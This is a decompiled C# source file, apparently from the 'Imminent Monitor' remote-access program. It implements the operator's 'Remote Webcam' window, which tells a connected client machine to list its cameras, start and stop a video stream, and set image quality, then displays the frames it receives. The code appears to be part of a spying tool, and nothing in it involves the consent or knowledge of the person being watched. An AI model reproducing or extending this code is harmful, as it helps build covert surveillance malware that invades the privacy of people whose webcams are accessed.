// Decompiled with JetBrains decompiler
// Type: FormCamera
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormCamera : Form
{
  private IContainer icontainer_0;
  private PictureBox pictureBox_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ToolStripMenuItem toolStripMenuItem_3;
  private ToolStripComboBox toolStripComboBox_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_4;
  private GControl2 gcontrol2_0;
  private Timer timer_0;
  private MenuStrip menuStrip_0;
  private GClass18 gclass18_0;
  private string string_0;
  private int int_0;

  public FormCamera(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.FormCamera_Load);
    this.FormClosing += new FormClosingEventHandler(this.FormCamera_FormClosing);
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.string_0 = string.Format("{0}/{1} - Remote Webcam", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.Text = this.string_0;
    Class97.smethod_11((Form) this);
    this.gclass18_0.method_20().formCamera_0 = this;
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormCamera));
    this.vmethod_1(new PictureBox());
    this.vmethod_21(new MenuStrip());
    this.vmethod_3(new ToolStripMenuItem());
    this.vmethod_5(new ToolStripMenuItem());
    this.vmethod_7(new ToolStripMenuItem());
    this.vmethod_9(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripComboBox());
    this.vmethod_13(new ToolStripSeparator());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_19(new Timer(this.icontainer_0));
    this.vmethod_17(new GControl2());
    ((ISupportInitialize) this.vmethod_0()).BeginInit();
    this.vmethod_20().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().BackColor = SystemColors.ActiveCaptionText;
    PictureBox pictureBox1 = this.vmethod_0();
    Point point1 = new Point(0, 27);
    Point point2 = point1;
    pictureBox1.Location = point2;
    this.vmethod_0().Name = "PictureBoxWebcam";
    PictureBox pictureBox2 = this.vmethod_0();
    Size size1 = new Size(554, 349);
    Size size2 = size1;
    pictureBox2.Size = size2;
    this.vmethod_0().SizeMode = PictureBoxSizeMode.StretchImage;
    this.vmethod_0().TabIndex = 22;
    this.vmethod_0().TabStop = false;
    this.vmethod_20().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_20().Items.AddRange(new ToolStripItem[4]
    {
      (ToolStripItem) this.vmethod_2(),
      (ToolStripItem) this.vmethod_4(),
      (ToolStripItem) this.vmethod_6(),
      (ToolStripItem) this.vmethod_8()
    });
    MenuStrip menuStrip1 = this.vmethod_20();
    point1 = new Point(0, 0);
    Point point3 = point1;
    menuStrip1.Location = point3;
    this.vmethod_20().Name = "MenuStripExControl";
    MenuStrip menuStrip2 = this.vmethod_20();
    size1 = new Size(554, 24);
    Size size3 = size1;
    menuStrip2.Size = size3;
    this.vmethod_20().TabIndex = 23;
    this.vmethod_20().Text = "MenuStripEx1";
    this.vmethod_2().Image = (Image) Class145.smethod_20();
    this.vmethod_2().Name = "ButtonStart";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_2();
    size1 = new Size(59, 20);
    Size size4 = size1;
    toolStripMenuItem1.Size = size4;
    this.vmethod_2().Text = "Start";
    this.vmethod_4().Enabled = false;
    this.vmethod_4().Image = (Image) Class145.smethod_21();
    this.vmethod_4().Name = "ButtonStop";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_4();
    size1 = new Size(59, 20);
    Size size5 = size1;
    toolStripMenuItem2.Size = size5;
    this.vmethod_4().Text = "Stop";
    this.vmethod_6().Enabled = false;
    this.vmethod_6().Name = "ToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_6();
    size1 = new Size(22, 20);
    Size size6 = size1;
    toolStripMenuItem3.Size = size6;
    this.vmethod_6().Text = "|";
    this.vmethod_8().DropDownItems.AddRange(new ToolStripItem[4]
    {
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_16()
    });
    this.vmethod_8().Image = (Image) Class145.smethod_61();
    this.vmethod_8().Name = "SettingsToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem4 = this.vmethod_8();
    size1 = new Size(77, 20);
    Size size7 = size1;
    toolStripMenuItem4.Size = size7;
    this.vmethod_8().Text = "Settings";
    this.vmethod_10().DropDownStyle = ComboBoxStyle.DropDownList;
    this.vmethod_10().FlatStyle = FlatStyle.System;
    this.vmethod_10().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_10().Name = "ToolStripComboBox1";
    ToolStripComboBox toolStripComboBox = this.vmethod_10();
    size1 = new Size(121, 21);
    Size size8 = size1;
    toolStripComboBox.Size = size8;
    this.vmethod_12().Name = "ToolStripSeparator2";
    ToolStripSeparator toolStripSeparator = this.vmethod_12();
    size1 = new Size(178, 6);
    Size size9 = size1;
    toolStripSeparator.Size = size9;
    this.vmethod_14().Image = (Image) Class145.smethod_49();
    this.vmethod_14().Name = "QualityToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem5 = this.vmethod_14();
    size1 = new Size(181, 22);
    Size size10 = size1;
    toolStripMenuItem5.Size = size10;
    this.vmethod_14().Text = "Quality (45%)";
    this.vmethod_18().Interval = 1000;
    this.vmethod_16().Name = "QualityScroller";
    GControl2 gcontrol2 = this.vmethod_16();
    size1 = new Size(104, 23);
    Size size11 = size1;
    gcontrol2.Size = size11;
    this.vmethod_16().Text = "ToolStripMenuItemEx1";
    this.vmethod_16().method_2(45);
    this.AutoScaleDimensions = new SizeF(7f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    size1 = new Size(554, 376);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_20());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormCamera);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X - Webcam";
    ((ISupportInitialize) this.vmethod_0()).EndInit();
    this.vmethod_20().ResumeLayout(false);
    this.vmethod_20().PerformLayout();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual PictureBox vmethod_0() => this.pictureBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(PictureBox pictureBox_1) => this.pictureBox_0 = pictureBox_1;

  internal virtual ToolStripMenuItem vmethod_2() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ToolStripMenuItem toolStripMenuItem_5)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_5;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_4() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ToolStripMenuItem toolStripMenuItem_5)
  {
    EventHandler eventHandler = new EventHandler(this.method_6);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_5;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_6() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ToolStripMenuItem toolStripMenuItem_5) => this.toolStripMenuItem_2 = toolStripMenuItem_5;

  internal virtual ToolStripMenuItem vmethod_8() => this.toolStripMenuItem_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_5) => this.toolStripMenuItem_3 = toolStripMenuItem_5;

  internal virtual ToolStripComboBox vmethod_10() => this.toolStripComboBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripComboBox toolStripComboBox_1) => this.toolStripComboBox_0 = toolStripComboBox_1;

  internal virtual ToolStripSeparator vmethod_12() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_5) => this.toolStripMenuItem_4 = toolStripMenuItem_5;

  internal virtual GControl2 vmethod_16() => this.gcontrol2_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(GControl2 gcontrol2_1)
  {
    EventHandler eventHandler_1 = new EventHandler(this.method_7);
    if (this.gcontrol2_0 != null)
      this.gcontrol2_0.method_5(eventHandler_1);
    this.gcontrol2_0 = gcontrol2_1;
    if (this.gcontrol2_0 == null)
      return;
    this.gcontrol2_0.method_4(eventHandler_1);
  }

  internal virtual Timer vmethod_18() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(Timer timer_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_8);
    if (this.timer_0 != null)
      this.timer_0.Tick -= eventHandler;
    this.timer_0 = timer_1;
    if (this.timer_0 == null)
      return;
    this.timer_0.Tick += eventHandler;
  }

  internal virtual MenuStrip vmethod_20() => this.menuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(MenuStrip menuStrip_1) => this.menuStrip_0 = menuStrip_1;

  private void FormCamera_Load(object sender, EventArgs e)
  {
    Class97.smethod_16(this.vmethod_20());
    this.gclass18_0.method_20().formCamera_0 = this;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.GetDevices
    });
  }

  private void FormCamera_FormClosing(object sender, FormClosingEventArgs e) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.StopStream
  });

  public void method_0(byte[] byte_0)
  {
    FormCamera.Class94 class94 = new FormCamera.Class94();
    class94.formCamera_0 = this;
    ++this.gclass18_0.method_20().formCamera_0.int_0;
    if (byte_0[0] == (byte) 81 & byte_0[1] == (byte) 67 & byte_0[2] == (byte) 76 & byte_0[3] == (byte) 90)
      byte_0 = LZLoader.Load.Decompress(byte_0, 0U);
    class94.image_0 = Class97.smethod_18(byte_0);
    this.Invoke((Delegate) new Delegate0(class94._Lambda\u0024__60));
  }

  public void method_1(object[] object_0)
  {
    if (object_0.Length > 2)
    {
      int num = object_0.Length - 1;
      for (int index = 2; index <= num; ++index)
        this.vmethod_10().Items.Add(RuntimeHelpers.GetObjectValue(object_0[index]));
      this.vmethod_10().SelectedIndex = 0;
    }
    else
    {
      int num = (int) MessageBox.Show("The selected client does not have a webcam", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      this.Close();
    }
  }

  private void method_2() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.StartStream,
    (object) this.vmethod_16().method_1(),
    (object) this.vmethod_10().SelectedIndex
  });

  private void method_3() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.StopStream
  });

  private void method_4(int int_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.Quality,
    (object) int_1
  });

  private void method_5(object sender, EventArgs e)
  {
    this.vmethod_18().Start();
    this.method_2();
    this.vmethod_2().Enabled = false;
    this.vmethod_4().Enabled = true;
  }

  private void method_6(object sender, EventArgs e)
  {
    this.vmethod_18().Stop();
    this.method_3();
    this.vmethod_2().Enabled = true;
    this.vmethod_4().Enabled = false;
  }

  private void method_7(object sender, EventArgs e)
  {
    this.method_4(this.vmethod_16().method_1());
    this.vmethod_14().Text = string.Format("Quality ({0}%)", (object) this.vmethod_16().method_1());
  }

  private void method_8(object sender, EventArgs e)
  {
    this.Text = this.string_0 + " - FPS: " + Conversions.ToString(this.int_0);
    this.int_0 = 0;
  }

  internal sealed class Class94
  {
    public Image image_0;
    public FormCamera formCamera_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__60() => this.formCamera_0.vmethod_0().Image = this.image_0;
  }
}
